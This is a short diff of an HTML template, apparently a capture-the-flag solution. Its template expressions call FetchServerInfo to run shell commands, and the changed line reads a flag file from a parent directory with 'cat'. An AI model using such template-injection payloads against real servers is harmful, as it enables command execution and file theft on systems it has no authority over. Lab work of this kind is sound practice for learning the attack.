@@ -33,7 +33,7 @@
                     <li>ServerInfo.Memory</li>
                     <li>{{.FetchServerInfo "ls"}}</li>
                     <li>{{.FetchServerInfo "ls .."}}</li>
-                    <li>{{.FetchServerInfo "ls ../.."}}</li>
+                    <li>{{.FetchServerInfo "cat ../flag628a9b6c09.txt"}}</li>
                 </ul>
                 <h3>Enter the link to your template!</h3>
                 <hr>
